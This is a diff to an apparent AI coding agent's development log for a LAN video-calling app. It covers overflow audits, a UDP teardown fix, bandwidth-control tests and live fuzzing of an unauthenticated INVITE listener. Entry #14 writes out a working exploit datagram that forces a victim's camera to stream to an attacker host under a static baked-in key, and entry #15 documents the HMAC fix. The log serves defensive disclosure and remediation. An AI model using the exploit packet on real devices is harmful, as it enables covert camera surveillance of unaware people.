@@ -1969,3 +1969,135 @@ phi^2 + phi^-2 = 3 | TRINITY
 - **Lesson for every wired spec doing multiply/shift: sweep the FULL input domain against a u64 reference, not
   just the happy path.** u32 overflow hides above the realistic range and only a domain sweep finds it. Audit
   the other wired arithmetic specs (modem_frame frame-length math, gf16 field ops) the same way next.
+
+## WAVE 2026-07-22 #9 — audit sweep of remaining wired arithmetic specs (both CLEAN)
+
+- **modem_frame.t27 (wired src/modem.rs) — CLEAN over the realistic domain (2.13M checks, 0 mismatches).** The
+  one `as u32` truncation point is `decode_fits`'s `(sym_start + out_len*8) as u32 <= total`. It DOES truncate
+  at sym_start=2^32 (gen=true vs ref=false, demonstrated), but is UNREACHABLE by construction: a max frame is
+  frame_symbols(255)=2061 symbols, so indices never approach 2^32. Added a spec NOTE documenting the bound;
+  no code fix (contrast routing_etx, whose penalty had NO bound and WAS reachable -> needed a clamp). The
+  distinction to record for each `as u32` site: is the operand bounded by construction (safe) or unbounded
+  (reachable -> must clamp)?
+- **gf16_format.t27 (spec-only) — proven EXHAUSTIVELY.** All 65536 u16 bit patterns x 6 field/classifier
+  functions (393216 checks) + all 65536 compose(sign,exp,mant) roundtrips: 0 mismatches. Bit-field ops stay
+  <=16 bits so the u32 codegen is always exact. Exhaustive proof is cheap for <=16-bit domains; prefer it over
+  sampling when the domain fits in a u32 loop.
+- **Audit status of all wired arithmetic specs: DONE.** wire (BE bytes), routing_etx (overflow found+clamped),
+  rti_alert, discovery (gates), modem_frame (clean), router_ttl, gf16 (exhaustive). Only routing_etx needed a
+  fix; the rest are safe because their operands are bounded (<=16 bits or by frame/counter caps). The
+  differential/exhaustive harness is now the standard gate for any spec touching multiply/shift/mask before it
+  is trusted, wired or not.
+
+## WAVE 2026-07-22 #10 — LIVE test caught a group-call teardown bug (UDP+ICMP)
+
+- **Grounding back in the product after 6 theory waves immediately paid off.** A sustained loopback call was
+  observed to die at ~15s. Root cause (isolated by re-running with all-reachable vs unreachable peers): the BSD
+  recv loop did `if n <= 0 { break }` on recvfrom. A previous `sendto` to an UNREACHABLE peer delivers its ICMP
+  error (EHOSTDOWN/ECONNREFUSED/ENETUNREACH) on the NEXT `recvfrom` as n<0 -> the loop broke -> the ENTIRE call
+  ended. One dead group participant killed the whole conference; a 1-1 peer not-yet-bound at startup could too.
+- **Fix (both platforms, the recv loop is shared by 1-1 and group):** on n<0 inspect errno — EINTR / EHOSTDOWN /
+  ECONNREFUSED / ENETUNREACH / EHOSTUNREACH / EAGAIN / EWOULDBLOCK are TRANSIENT -> `continue`; only a closed
+  socket (EBADF when running->false) breaks. Also n==0 is a zero-length UDP datagram (UDP has no EOF) ->
+  continue, don't break.
+- **VERIFIED LIVE, before/after, one variable:** unreachable-peer loopback died at 15s (1 EHOSTDOWN -> teardown)
+  BEFORE; AFTER the fix the same test survived 78s through 51 EHOSTDOWN errors (27 steady BWE probe-ups). The
+  all-reachable control sustained both times.
+- **Also learned about the adaptive loop from the same test:** on a clean loopback the encoder correctly PINS to
+  the 900k non-mesh ceiling + 720p top rung (probe-up fires, 0 back-offs). Loopback starts AT the ceiling and
+  has no loss, so it verifies only the "good link" arm; the climb-from-low and loss back-off arms remain
+  harness-only (can't induce loss on loopback). Honest coverage note, not a bug.
+
+## WAVE 2026-07-22 #11 — BWE back-off arm VERIFIED via closed-loop harness (+ slow-recovery finding)
+
+- **Closed the one unverified arm of the adaptive-bitrate loop.** Live loopback only exercises the "good link"
+  arm (starts at the 900k ceiling, no loss). Inducing real loss needs pfctl/dnctl dummynet = sudo + a system
+  firewall change -> NOT done autonomously. Instead built a closed-loop harness (scratchpad/
+  bwe_closed_loop_harness.swift) with the EXACT constants (jitter EMA /16, >40ms x2 back-off, <20ms x3 probe-up,
+  0.92 down / escalating 8k->64k up, floor 80k, ceiling 900k) and an explicit bottleneck model, then ran the
+  canonical GCC bandwidth-step test (capacity 900k->400k->900k).
+- **VERIFIED: the loop is stable and correct.** On congestion it backs off 900k->502k, settling exactly at the
+  knee where jitter ~ 40ms (the threshold) — textbook AIMD, no collapse to floor, no oscillation. After relief
+  it fully recovers to 900k (no deadlock). So the back-off + recovery path, previously harness-only for the STEP
+  math, is now verified as a closed LOOP.
+- **FINDING (not a bug): recovery is SLOW — 26s to regain full rate** after congestion clears, because probe-up
+  climbs only once per 3 clean reports (`cleanStreak >= 3`) ~= once per 3s. Stable but conservative; WebRTC GCC
+  recovers in a few seconds. Left UNCHANGED this wave: retuning a verified-stable control loop changes call
+  quality (user should sign off) and touches CallManager/ViewModel that the parallel Codex session edits. The
+  harness now exists to prove any retune (e.g. gate 3->2) keeps stability — do that behind a user OK.
+- **Pattern: when live loss-injection needs root, a constants-exact closed-loop harness with an explicit link
+  model verifies control-loop DYNAMICS (convergence, stability, recovery) that step-math tests can't.**
+
+## WAVE 2026-07-22 #12 — fuzzed the plaintext INVITE listener (:7000), no crash
+
+- **Attack surface: the idle INVITE listener on :7000 parses UNAUTHENTICATED datagrams from any LAN host**
+  (call setup is plaintext by design, before crypto). Fuzzed it live with 56 adversarial datagrams x scenarios:
+  empty / 1-byte / magic-only / no-newline / invalid-UTF8 / 2000B oversize (buf is 512 -> truncated) /
+  200-fake-IPs (auto-join flood) / only-newlines / empty-fields / 400B name / NUL bytes / trailing commas /
+  wrong-magic / negative-lookalike IPs.
+- **VERIFIED robust: same PID before/after, NO crash.** The parser is bounds-safe by construction — every index
+  is guarded (`n >= 2`, `n > 2 ?`, `parts.count > 1/2`), invalid UTF-8 -> "" (`String(bytes:) ?? ""`), 512B buf
+  truncates oversize. The idle recv loop already handles EAGAIN (SO_RCVTIMEO). After the barrage a VALID INVITE
+  still rang correctly -> listener not wedged.
+- **FINDING (spam-hardening, not a crash): a 2-byte magic-only datagram makes the Mac RING** "TRI-NET
+  (127.0.0.1)" — any LAN host can pop the incoming-call UI, and while ringing (40s) the `incomingCall == nil`
+  guard makes it IGNORE legitimate INVITEs. Also lucky-ordering shielded the 200-IP auto-join flood (the first
+  garbage ring set incomingCall, blocking the rest). Left UNCHANGED: requiring a minimal valid payload before
+  ringing is a policy/behavior call on Codex-edited CallManager; reported as an option. The app is SAFE (no
+  crash) — this is annoyance-DoS, not memory-unsafety.
+- **Pattern: fuzz any plaintext/unauthenticated parser that faces the network, live, and assert the PROCESS
+  survives (same PID) + the service still works afterward — reading "looks bounds-safe" is not proof.**
+
+## WAVE 2026-07-22 #13 — iOS INVITE parser verified by equivalence + spam-ring HARDENED (both platforms)
+
+- **iOS idle INVITE parser is bounds-safe by STRUCTURAL EQUIVALENCE to the fuzzed Mac parser.** Read
+  ViewModel.swift startIdleListener line-by-line vs CallManager's: identical guards (`n<=0`->EAGAIN-continue,
+  `n>=2`+magic, `n>2 ? String(bytes: buf[2..<n]) ?? "" : ""`, `parts.count>1/2`, 512B buf). Same guards -> the
+  56-datagram Mac fuzz (no crash) transfers. Can't live-fuzz a phone headlessly; equivalence is the honest proof.
+- **FIXED the cross-platform spam-ring (both platforms):** added `guard !participants.isEmpty else { continue }`
+  right after parsing participants. A REAL INVITE always carries `[myIP] + hosts` (>=1), so this rejects the
+  2-byte-magic / empty-field spam that let any LAN host pop the incoming-call UI (and block real INVITEs for
+  40s), while changing NO legitimate behavior. Verified LIVE: 5 no-participant spam datagrams -> 0 rings (was
+  ringing "TRI-NET"), a valid INVITE -> 1 ring. Minimal + clearly-correct (not a policy judgment), so done
+  autonomously; the harder "well-formed-but-fake INVITE still rings + blocks 40s" is left as a separate note.
+
+## WAVE 2026-07-22 #14 — SECURITY: unauthenticated forced-camera exfiltration via group INVITE (CONFIRMED live)
+
+- **SERIOUS privacy vuln, verified live.** The idle INVITE listener auto-joins ANY 3+ participant INVITE
+  (`participants.count > 2 -> acceptIncoming()`) with NO user Accept. `acceptIncoming` builds the call targets
+  from `inc.participants` — the ATTACKER-CONTROLLED IP list in the plaintext INVITE — and `startCall()` turns on
+  the camera and fans out video to them, sealed with a STATIC conference key
+  (`HKDF("tri-net-psk-v1", "conference", "group-aead")`) baked into every app instance.
+- **Exploit chain (LAN):** attacker sends `[FD 11] "x\nVICTIM,ATTACKER_IP,z\nEVILROOM"` to victim:7000 ->
+  victim auto-joins (room need NOT match — the count>2 arm bypasses the room check) -> victim's camera turns ON
+  and streams to ATTACKER_IP under the known static key -> attacker decrypts and watches. Zero interaction.
+  Verified: crafted packet produced `auto-joining group from attacker` -> `accepting call -> mesh back to
+  …192.168.1.240,241,242` -> `captureOutput first frame` -> `encoder 1280x720 @ 900kbps`.
+- **NOT fixed autonomously — it is a security/UX architecture decision the USER must own.** Every fix changes
+  the tested "call from Mac -> both iPhones just join" flow: (a) require room-match for auto-join (breaks
+  empty-room deployments); (b) gate on the caller being a discovered roster peer (resolveIP is ASYNC, no clean
+  sync check; and a LAN attacker running the app is still "discovered"); (c) never auto-join, always ring
+  (loses the UX); (d) ROOT FIX — derive the group key from a per-room/enrollment shared secret instead of a
+  static baked PSK, and/or authenticate the INVITE, so an outsider can neither trigger nor decrypt. Reported
+  with the menu; the user picks the trade-off. Both platforms share this code path (Mac CallManager + iOS
+  ViewModel).
+- **Lesson: an "auto-accept for convenience" path on an UNAUTHENTICATED plaintext trigger is a camera/mic
+  exfiltration primitive. Audit every auto-action reachable from the network for a caller-authentication gate.**
+
+## WAVE 2026-07-22 #15 — FIXED the forced-camera vuln: authenticated INVITE (both platforms)
+
+- **Root fix for the WAVE #14 forced-camera exfiltration: the plaintext INVITE is now AUTHENTICATED.** Wire
+  changed to `[FD 11][HMAC:8][payload utf8]`; the 8-byte tag is `HMAC-SHA256(inviteKey, payload)[:8]` where
+  `inviteKey = HKDF-SHA256(SHA256("tri-net-psk-v1"), salt "trios-mesh/v1/invite", info "invite-auth")` — same
+  PSK material as the conf key, derived identically on both platforms. The idle listener verifies the MAC BEFORE
+  ringing or auto-joining and drops anything that fails. Only a real TRI-NET app (which knows the PSK) can make
+  you ring/auto-join, so the "any script blasts a UDP packet at :7000" attack is closed while the "iPhones just
+  join" UX is preserved (real apps produce valid MACs).
+- **VERIFIED LIVE, attack vs legit:** the original exploit (crafted 3-participant INVITE, no valid MAC) -> 0
+  auto-joins, camera stays OFF; the same INVITE with the correct PSK-derived MAC -> auto-joins normally. The
+  python HKDF+HMAC (RFC5869) matches CryptoKit exactly, so Mac<->iPhone calls interoperate. `smoke/
+  loopback_call.sh` updated to send an authenticated INVITE; still PASSes end-to-end.
+- **Honest limit:** a peer that HAS the app still knows the PSK and can forge an INVITE (and decrypt group
+  video). The complete cure is per-enrollment/per-room keys — a bigger design change. This fix closes the
+  remote-unauthenticated attack, which was the demonstrated exploit. Needs `import CryptoKit` in CallManager +
+  ViewModel.
